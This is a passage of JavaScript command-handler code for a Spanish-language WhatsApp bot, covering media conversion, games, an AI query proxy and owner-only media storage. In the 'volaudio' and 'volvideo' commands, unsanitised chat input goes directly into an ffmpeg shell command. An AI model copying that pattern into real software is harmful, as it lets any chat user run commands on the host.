        if ((quoted.msg || quoted).seconds > 9) return replygc('¡Máximo 9 segundos!')
        let media = await quoted.download()
        let encmedia = await SenseiOfc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
    } else {
        replygc(`¿Foto o video?`)
    }
}
break
case 'sticker2': case 's2': {
    if (!isPremium) return replyprem(mess.premium)
    if (!args[0]) return replygc(`Falta el nombre del paquete. Ejemplo: ${prefix + command} nombre|autor`)
    const swn = args.join(" ")
    const pcknm = swn.split("|")[0]
    const atnm = swn.split("|")[1]

    if (m.quoted && (m.quoted.isImage || m.quoted.isVideo || m.quoted.isAnimated)) {
        let media = await m.quoted.download()
        let encmedia = await SenseiOfc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
    } else {
        replygc(`Responde a una imagen, video o GIF para convertirlo en sticker`)
    }
}
break
case 'toimage':
case 'toimg': {
    if (!/webp/.test(mime)) return replygc(`Responde a un sticker con la leyenda *${prefix + command}*`)
    await StickWait()
    let media = await SenseiOfc.downloadAndSaveMediaMessage(qmsg)
    let ran = await getRandom('.png')
    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
        fs.unlinkSync(media)
        if (err) return err
        let buffer = fs.readFileSync(ran)
        SenseiOfc.sendMessage(m.chat, {
            image: buffer
        }, {
            quoted: m
        })
        fs.unlinkSync(ran)
    })
}
break
case 'tomp4':
case 'tovideo': {
    if (!/webp/.test(mime)) return replygc(`Responde a un sticker con la leyenda *${prefix + command}*`)
    await StickWait()
    let media = await SenseiOfc.downloadAndSaveMediaMessage(qmsg)
    let webpToMp4 = await webp2mp4File(media)
    await SenseiOfc.sendMessage(m.chat, {
        video: {
            url: webpToMp4.result,
            caption: 'Convertir Webp a Video'
        }
    }, {
        quoted: m
    })
    await fs.unlinkSync(media)
}
break
case 'toaud':
case 'toaudio': {
    if (!/video/.test(mime) && !/audio/.test(mime)) return replygc(`Envía/Responde Video/Audio que deseas convertir en audio con la leyenda ${prefix + command}`)
    await StickWait()
    let media = await SenseiOfc.downloadMediaMessage(qmsg)
    let audio = await toAudio(media, 'mp4')
    SenseiOfc.sendMessage(m.chat, {
        audio: audio,
        mimetype: 'audio/mpeg'
    }, {
        quoted: m
    })
}
break
case 'tomp3': {
    if (!/video/.test(mime) && !/audio/.test(mime)) return replygc(`Envía/Responde Video/Audio que deseas convertir en MP3 con la leyenda ${prefix + command}`)
    await StickWait()
    let media = await SenseiOfc.downloadMediaMessage(qmsg)
    let audio = await toAudio(media, 'mp4')
    SenseiOfc.sendMessage(m.chat, {
        document: audio,
        mimetype: 'audio/mp3',
        fileName: `dgxeon.mp3`
    }, {
        quoted: m
    })
}
break
case 'tovn':
case 'toptt': {
    if (!/video/.test(mime) && !/audio/.test(mime)) return replygc(`Envía/Responde Video/Audio que deseas convertir en un VN con la leyenda ${prefix + command}`)
    await StickWait()
    let media = await SenseiOfc.downloadMediaMessage(qmsg)
    let {
        toPTT
    } = require('./lib/converter')
    let audio = await toPTT(media, 'mp4')
    SenseiOfc.sendMessage(m.chat, {
        audio: audio,
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    })
}
break
case 'togif': {
    if (!/webp/.test(mime)) return replygc(`Responde a un sticker con la leyenda *${prefix + command}*`)
    await StickWait()
    let media = await SenseiOfc.downloadAndSaveMediaMessage(qmsg)
    let webpToMp4 = await webp2mp4File(media)
    await SenseiOfc.sendMessage(m.chat, {
        video: {
            url: webpToMp4.result,
            caption: 'Convertir Webp a Video'
        },
        gifPlayback: true
    }, {
        quoted: m
    })
    await fs.unlinkSync(media)
}
break
case 'tourl': {
    await StickWait()
    let media = await SenseiOfc.downloadAndSaveMediaMessage(qmsg)
    if (/image/.test(mime)) {
        let anu = await TelegraPh(media)
        replygc(util.format(anu))
    } else if (!/image/.test(mime)) {
        let anu = await UploadFileUgu(media)
        replygc(util.format(anu))
    }
    await fs.unlinkSync(media)
}
break
case 'emojimix': {
    let [emoji1, emoji2] = text.split`+`
    if (!emoji1) return replygc(`Ejemplo: ${prefix + command} 😅+🤔`)
    if (!emoji2) return replygc(`Ejemplo: ${prefix + command} 😅+🤔`)
    await StickWait()
    let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=API_KEY&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
    for (let res of anu.results) {
        let encmedia = await SenseiOfc.sendImageAsSticker(m.chat, res.url, m, {
            packname: global.packname,
            author: global.author,
            categories: res.tags
        })
    }
}
break
case 'emojimix2': {
    if (!text) return replygc(`Ejemplo: ${prefix + command} 😅`)
    let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=API_KEY&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
    for (let res of anu.results) {
        let encmedia = await SenseiOfc.sendImageAsSticker(m.chat, res.url, m, {
            packname: global.packname,
            author: global.author,
            categories: res.tags
        })
    }
}
break
case 'toonce':
case 'toviewonce': {
    if (!quoted) return replygc(`Responde a una imagen o video`)
    if (/image/.test(mime)) {
        anuan = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
        SenseiOfc.sendMessage(m.chat, {
            image: {
                url: anuan
            },
            caption: mess.done,
            fileLength: "999",
            viewOnce: true
        }, {
            quoted: m
        })
    } else if (/video/.test(mime)) {
        anuanuan = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
        SenseiOfc.sendMessage(m.chat, {
            video: {
                url: anuanuan
            },
            caption: mess.done,
            fileLength: "99999999",
            viewOnce: true
        }, {
            quoted: m
        })
    } else if (/audio/.test(mime)) {
        bebasap = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
        SenseiOfc.sendMessage(m.chat, {
            audio: {
                url: bebasap
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            viewOnce: true
        })
    }
}
break
case 'fliptext': {
    if (args.length < 1) return replygc(`Ejemplo:\n${prefix}fliptext dgxeon`)
    quere = args.join(" ")
    flipe = quere.split('').reverse().join('')
    replygc(`\`\`\`「 TEXTO AL REVÉS 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Al Revés :*\n${flipe}`)
}
break
case 'toqr': {
    if (!q) return replygc('¡Por favor incluye un enlace o texto!')
    const QrCode = require('qrcode-reader')
    const qrcode = require('qrcode')
    let qyuer = await qrcode.toDataURL(q, { scale: 35 })
    let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
    let buff = getRandom('.jpg')
    await fs.writeFileSync('./' + buff, data)
    let medi = fs.readFileSync('./' + buff)
    await SenseiOfc.sendMessage(from, { image: medi, caption: "¡Aquí lo tienes!" }, { quoted: m })
    setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}
break
case 'volaudio': {
    if (!args.join(" ")) return replygc(`Ejemplo: ${prefix + command} 10`)
    media = await SenseiOfc.downloadAndSaveMediaMessage(quoted, "volume")
    rname = getRandom('.mp3')
    exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
        fs.unlinkSync(media)
        if (err) return replygc('¡Error!')
        jadie = fs.readFileSync(rname)
        SenseiOfc.sendMessage(from, { audio: jadie, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
        fs.unlinkSync(rname)
    })
}
break
case 'volvideo': {
    if (!args.join(" ")) return replygc(`Ejemplo: ${prefix + command} 10`)
    media = await SenseiOfc.downloadAndSaveMediaMessage(quoted, "volume")
    rname = getRandom('.mp4')
    exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
        fs.unlinkSync(media)
        if (err) return replygc('¡Error!')
        jadie = fs.readFileSync(rname)
        SenseiOfc.sendMessage(from, { video: jadie, mimetype: 'video/mp4' }, { quoted: m })
        fs.unlinkSync(rname)
    })
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
        let set
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
        if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
        if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
        if (/earrape/.test(command)) set = '-af volume=12'
        if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
        if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
        if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
        if (/reverse/.test(command)) set = '-filter_complex "areverse"'
        if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
        if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
        if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
        if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
        if (/audio/.test(mime)) {
            await StickWait()
            let media = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
            let ran = getRandom('.mp3')
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygc(err)
                let buff = fs.readFileSync(ran)
                SenseiOfc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
            })
        } else replygc(`Responde con el audio que quieres cambiar con una leyenda *${prefix + command}*`)
    } catch (e) {
        replygc(e)
    }
break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygc(teks)
}
break
//game
case 'ttc':
case 'ttt':
case 'tictactoe': {
    let TicTacToe = require("./lib/tictactoe")
    this.game = this.game ? this.game : {}
    if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygc('Ya estás en el juego')
    let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
    if (room) {
        replygc('¡Socio no encontrado!')
        room.o = m.chat
        room.game.playerO = m.sender
        room.state = 'PLAYING'
        let arr = room.game.render().map(v => {
            return {
                X: '❌',
                O: '⭕',
                1: '1️⃣',
                2: '2️⃣',
                3: '3️⃣',
                4: '4️⃣',
                5: '5️⃣',
                6: '6️⃣',
                7: '7️⃣',
                8: '8️⃣',
                9: '9️⃣',
            } [v]
        })
        let str = `ID de sala: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Espera @${room.game.currentTurn.split('@')[0]}

Escribe *surrender* para rendirte y admitir la derrota`
        if (room.x !== room.o) await SenseiOfc.sendText(room.x, str, m, {
            mentions: parseMention(str)
        })
        await SenseiOfc.sendText(room.o, str, m, {
            mentions: parseMention(str)
        })
    } else {
        room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
        }
        if (text) room.name = text
        replygc('Esperando al socio' + (text ? ` escribe el siguiente comando ${prefix}${command} ${text}` : ''))
        this.game[room.id] = room
    }
}
break
case 'delttc':
case 'delttt': {
    this.game = this.game ? this.game : {}
    try {
        if (this.game) {
            delete this.game
            SenseiOfc.sendText(m.chat, `Sesión de TicTacToe eliminada con éxito`, m)
        } else if (!this.game) {
            replygc(`La sesión de TicTacToe🎮 no existe`)
        } else mewReply('?')
    } catch (e) {
        replygc('error')
    }
}
break
case 'suitpvp':
case 'suit': {
    this.suit = this.suit ? this.suit : {}
    let poin = 10
    let poin_lose = 10
    let timeout = 60000
    if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygc(`Termina tu juego de suit anterior`)
    if (m.mentionedJid[0] === m.sender) return replygc(`¡No puedo jugar conmigo mismo!`)
    if (!m.mentionedJid[0]) return replygc(`_¿A quién quieres retar?_\nEtiqueta a la persona..\n\nEjemplo: ${prefix}suit @${owner[1]}`, m.chat, {
        mentions: [owner[1] + '@s.whatsapp.net']
    })
    if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygc(`La persona a la que estás desafiando está jugando al suit con otra persona :(`)
    let id = 'suit_' + new Date() * 1
    let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} retó a @${m.mentionedJid[0].split`@`[0]} a jugar a los trajes

Por favor @${m.mentionedJid[0].split`@`[0]} escribe aceptar/rechazar`
    this.suit[id] = {
        chat: await SenseiOfc.sendText(m.chat, caption, m, {
            mentions: parseMention(caption)
        }),
        id: id,
        p: m.sender,
        p2: m.mentionedJid[0],
        status: 'wait',
        waktu: setTimeout(() => {
            if (this.suit[id]) SenseiOfc.sendText(m.chat, `_Se acabó el tiempo del suit_`, m)
            delete this.suit[id]
        }, 60000),
        poin,
        poin_lose,
        timeout
    }
}
break
case 'mathquiz':
case 'math': {
    if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygc(`¡Hay sesiones sin terminar!`);
    let { genMath, modes } = require('./lib/math');
    if (!text) return replygc(`Modo: ${Object.keys(modes).join(' | ')}\nEjemplo de uso: ${prefix}math medium`);
    let result = await genMath(text.toLowerCase());
    SenseiOfc.sendText(m.chat, `*¿Cuál es el resultado de: ${result.soal.toLowerCase()}*?\n\nTiempo: ${(result.waktu / 1000).toFixed(2)} segundo`, m).then(() => {
        kuismath[m.sender.split('@')[0]] = result.jawaban;
    });
    await sleep(result.waktu);
    if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
        console.log("Respuesta: " + result.jawaban);
        replygc("Se acabó el tiempo\nRespuesta: " + kuismath[m.sender.split('@')[0]]);
        delete kuismath[m.sender.split('@')[0]];
    }
}
break
case 'afk': {
    let user = global.db.data.users[m.sender];
    user.afkTime = + new Date;
    user.afkReason = text;
    replygc(`${m.pushName} *Se ha ido AFK${text ? `: ${text}` : ''}`);
}
break
case 'ai':
case 'ask':
case 'openai': {
    if (db.data.users[sender].limit < 1) return replygc(mess.limit)
    if (!q) return replygc(`Ejemplo: ${prefix + command} ¿quién es ronaldo?`)
    var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
    var isi = isiai.result
    await replygc(isi)
}
break
case 'qc': case 'text': {
    if (!args[0] && !m.quoted) {
        return replygc(`Where is the text?`);
    }

    let userPfp;
    if (m.quoted) {
        try {
            userPfp = await SenseiOfc.getProfilePicture(m.quoted.sender);
        } catch (e) {
            userPfp = defaultpp;
        }
    } else {
        try {
            userPfp = await SenseiOfc.getProfilePicture(m.sender);
        } catch (e) {
            userPfp = defaultpp;
        }
    }

    const waUserName = pushname;
    const quoteText = m.quoted ? m.quoted.body : args.join(" ");
    const quoteJson = {
        type: "quote",
        format: "png",
        backgroundColor: "#FFFFFF",
        width: 700,
        height: 580,
        scale: 2,
        messages: [
            {
                entities: [],
                avatar: true,
                from: {
                    id: 1,
                    name: waUserName,
                    photo: {
                        url: userPfp,
                    },
                },
                text: quoteText,
                replyMessage: {},
            },
        ],
    };

    try {
        const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
            headers: { "Content-Type": "application/json" },
        });

        const buffer = Buffer.from(quoteResponse.data.result.image, "base64");
        SenseiOfc.sendImageAsSticker(m.chat, buffer, m, {
            packname: packname,
            author: author,
        });
    } catch (error) {
        console.error(error);
        replygc('Error');
    }
}
break
    case 'ephemeral': {
                if (!m.isGroup) return StickGroup()
                if (!isBotAdmins) return StickBotAdmin()
                if (!isAdmins) return StickAdmin()
                if (!text) return replygc('envie activar o descartivcar lso mensajes tenporales')
                if (args[0] === 'on') {
                    await SenseiOfc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygc(`Done`)
                } else if (args[0] === 'off') {
                    await SenseiOfc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygc(`Done`)
                }
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 SenseiOfc.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!TheCreator) return StickOwner()
               if (args.length < 1) return replygc('on/off?')
               if (args[0] === 'on') {
                  antiswview = true
                  replygc(`${command} está habilitado`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  replygc(`${command} Está deshabilitado`)
               }
            }
            break
case 'anticall': case 'antillamadas': {
    if (!TheCreator) return StickOwner()
    if (args.length < 1) return replygc('on/activar/off/desactivar?')
    const action = args[0].toLowerCase()
    if (['on', 'activar'].includes(action)) {
        anticall = true
        replygc(`${command} está habilitado`)
    } else if (['off', 'desactivar'].includes(action)) {
        anticall = false
        replygc(`${command} está deshabilitado`)
    } else {
        replygc('Por favor, utiliza "on" o "activar" para habilitar, y "off" o "desactivar" para deshabilitar.')
    }
}
break
             break
case 'addvideo': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('¿Cuál es el nombre del video?')
  if (Video.includes(q)) return replygc("Este nombre ya está en uso")
  let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
  Video.push(q)
  await fsx.copy(delb, `./Media/video/${q}.mp4`)
  fs.writeFileSync('./Media/database/xeonvideo.json', JSON.stringify(Video))
  fs.unlinkSync(delb)
  replygc(`Éxito al agregar video\nVerifica escribiendo ${prefix}listvideo`)
}
break
case 'delvideo': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('Ingresa el nombre del video')
  if (!Video.includes(q)) return replygc("Este nombre no existe en la base de datos")
  let wanu = Video.indexOf(q)
  Video.splice(wanu, 1)
  fs.writeFileSync('./Media/database/xeonvideo.json', JSON.stringify(Video))
  fs.unlinkSync(`./Media/video/${q}.mp4`)
  replygc(`Éxito al eliminar video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of Video) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Video.length}*`
replygc(teks)
}
break
case 'addimage': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('¿Cuál es el nombre de la imagen?')
  if (Image.includes(q)) return replygc("Este nombre ya está en uso")
  let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
  Image.push(q)
  await fsx.copy(delb, `./Media/image/${q}.jpg`)
  fs.writeFileSync('./Media/database/xeonimage.json', JSON.stringify(Image))
  fs.unlinkSync(delb)
  replygc(`Éxito al agregar imagen\nVerifica escribiendo ${prefix}listimage`)
}
break
case 'delimage': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('Ingresa el nombre de la imagen')
  if (!Image.includes(q)) return replygc("Este nombre no existe en la base de datos")
  let wanu = Image.indexOf(q)
  Image.splice(wanu, 1)
  fs.writeFileSync('./Media/database/xeonimage.json', JSON.stringify(Image))
  fs.unlinkSync(`./Media/image/${q}.jpg`)
  replygc(`Éxito al eliminar imagen ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of Image) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Image.length}*`
replygc(teks)
}
break
case 'addsticker': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('¿Cuál es el nombre del sticker?')
  if (Sticker.includes(q)) return replygc("Este nombre ya está en uso")
  let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
  Sticker.push(q)
  await fsx.copy(delb, `./Media/sticker/${q}.webp`)
  fs.writeFileSync('./Media/database/xeonsticker.json', JSON.stringify(Sticker))
  fs.unlinkSync(delb)
  replygc(`Éxito al agregar sticker\nVerifica escribiendo ${prefix}liststicker`)
}
break
case 'delsticker': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('Ingresa el nombre del sticker')
  if (!Sticker.includes(q)) return replygc("Este nombre no existe en la base de datos")
  let wanu = Sticker.indexOf(q)
  Sticker.splice(wanu, 1)
  fs.writeFileSync('./Media/database/xeonsticker.json', JSON.stringify(Sticker))
  fs.unlinkSync(`./Media/sticker/${q}.webp`)
  replygc(`Éxito al eliminar sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of Sticker) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Sticker.length}*`
replygc(teks)
}
break
case 'addmsg': {
  if (!TheCreator) return StickOwner()
  if (!m.quoted) return replygc('Responde al mensaje que deseas guardar en la base de datos')
  if (!text) return replygc(`Ejemplo: ${prefix + command} nombre`)
  let msgs = global.db.data.database
  if (text.toLowerCase() in msgs) return replygc(`'${text}' ya está registrado en la lista de mensajes`)
  msgs[text.toLowerCase()] = quoted.fakeObj
  replygc(`Mensaje añadido con éxito en la lista de mensajes como '${text}'
  
Accede con ${prefix}getmsg ${text}

Ver la lista de mensajes con ${prefix}listmsg`)
}
break
case 'getmsg': {
  if (!text) return replygc(`Ejemplo: ${prefix + command} nombre\n\nVer la lista de mensajes con ${prefix}listmsg`)
  let msgs = global.db.data.database
  if (!(text.toLowerCase() in msgs)) return replygc(`'${text}' no está en la lista de mensajes`)
  SenseiOfc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygc(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
  if (!TheCreator) return StickOwner()
  let msgs = global.db.data.database
  if (!(text.toLowerCase() in msgs)) return replygc(`'${text}' no está en la lista de mensajes`)
  delete msgs[text.toLowerCase()]
  replygc(`Se eliminó '${text}' correctamente de la lista de mensajes`)
}
break
case 'addvn': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('¿Cuál es el nombre del audio?')
  if (VoiceNote.includes(q)) return replygc("Este nombre ya está en uso")
  let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
  VoiceNote.push(q)
  await fsx.copy(delb, `./Media/audio/${q}.mp3`)
  fs.writeFileSync('./Media/database/xeonvn.json', JSON.stringify(VoiceNote))
  fs.unlinkSync(delb)
  replygc(`Éxito al agregar audio\nVerifica escribiendo ${prefix}listvn`)
}
break
case 'delvn': {
  if (!TheCreator) return StickOwner()
  if (args.length < 1) return replygc('Ingresa el nombre del audio')
  if (!VoiceNote.includes(q)) return replygc("Este nombre no existe en la base de datos")
  let wanu = VoiceNote.indexOf(q)
  VoiceNote.splice(wanu, 1)
  fs.writeFileSync('./Media/database/xeonvn.json', JSON.stringify(VoiceNote))
  fs.unlinkSync(`./Media/audio/${q}.mp3`)
  replygc(`Éxito al eliminar audio ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNote) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNote.length}*`
replygc(teks)
}
break
case 'addzip': {
    if (!TheCreator) return StickOwner()

    if (args.length < 1) return replygc(`¿Cuál es el nombre del archivo zip?`)
    let teks = `${text}`
    {
        if (Zip.includes(teks)) return replygc("Este nombre ya está en uso")
        let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
        Zip.push(teks)
        await fsx.copy(delb, `./Media/zip/${teks}.zip`)
        fs.writeFileSync('./Media/database/zip.json', JSON.stringify(Zip))
        fs.unlinkSync(delb)
        replygc(`Éxito al agregar el archivo zip\nPara verificar, escriba ${prefix}listzip`)
    }
}
break
case 'delzip': {
    if (!TheCreator) return StickOwner()

    if (args.length < 1) return replygc('Ingresa el nombre del archivo zip de la lista')
    let teks = `${text}`
    {
        if (!Zip.includes(teks)) return replygc("Este nombre no existe en la base de datos")
        let wanu = Zip.indexOf(teks)
        Zip.splice(wanu, 1)
        fs.writeFileSync('./Media/database/zip.json', JSON.stringify(Zip))
        fs.unlinkSync(`./Media/zip/${teks}.zip`)
        replygc(`Se eliminó el archivo zip con éxito: ${teks}`)
    }
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of Zip) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${Zip.length}*`
replygc(teksooooo)
}
break
case 'addapk': {
  if (!TheCreator) return StickOwner()

  if (args.length < 1) return replygc('¿Cuál es el nombre del APK?')
  let teks = `${text}`
  {
    if (Apk.includes(teks)) return replygc("Este nombre ya está en uso")
    let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
    Apk.push(teks)
    await fsx.copy(delb, `./Media/apk/${teks}.apk`)
    fs.writeFileSync('./Media/database/apk.json', JSON.stringify(Apk))
    fs.unlinkSync(delb)
    replygc(`Éxito al agregar APK\nPara verificar, escribe ${prefix}listapk`)
  }
}
break
case 'delapk': {
  if (!TheCreator) return StickOwner()

  if (args.length < 1) return replygc('¿Nombre del APK?')
  let teks = `${text}`
  {
    if (!Apk.includes(teks)) return replygc("Este nombre no existe en la base de datos")
    let wanu = Apk.indexOf(teks)
    Apk.splice(wanu, 1)
    fs.writeFileSync('./Media/database/apk.json', JSON.stringify(Apk))
    fs.unlinkSync(`./Media/apk/${teks}.apk`)
    replygc(`APK ${teks} eliminado exitosamente`)
  }
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of Apk) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${Apk.length}`
replygc(teksoooooo)
}
break
case 'addpdf': {
  if (!TheCreator) return StickOwner()

  if (args.length < 1) return replygc('¿Cuál es el nombre del PDF?')
  let teks = `${text}`
  {
    if (Doc.includes(teks)) return replygc("Este nombre ya está en uso")
    let delb = await SenseiOfc.downloadAndSaveMediaMessage(quoted)
    Doc.push(teks)
    await fsx.copy(delb, `./Media/doc/${teks}.pdf`)
    fs.writeFileSync('./Media/database/doc.json', JSON.stringify(Doc))
    fs.unlinkSync(delb)
    replygc(`Éxito al agregar PDF\nPara verificar, escribe ${prefix}listpdf`)
  }
}
break
case 'delpdf': {
  if (!TheCreator) return StickOwner()

  if (args.length < 1) return replygc('Ingresa el nombre')
  let teks = `${text}`
  {
    if (!Doc.includes(teks)) return replygc("Este nombre no existe en la base de datos")
    let wanu = Doc.indexOf(teks)
    Doc.splice(wanu, 1)
    fs.writeFileSync('./Media/database/doc.json', JSON.stringify(Doc))
    fs.unlinkSync(`./Media/doc/${teks}.pdf`)
    replygc(`PDF ${teks} eliminado exitosamente`)
  }
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of Doc) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${Doc.length}*`
replygc(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
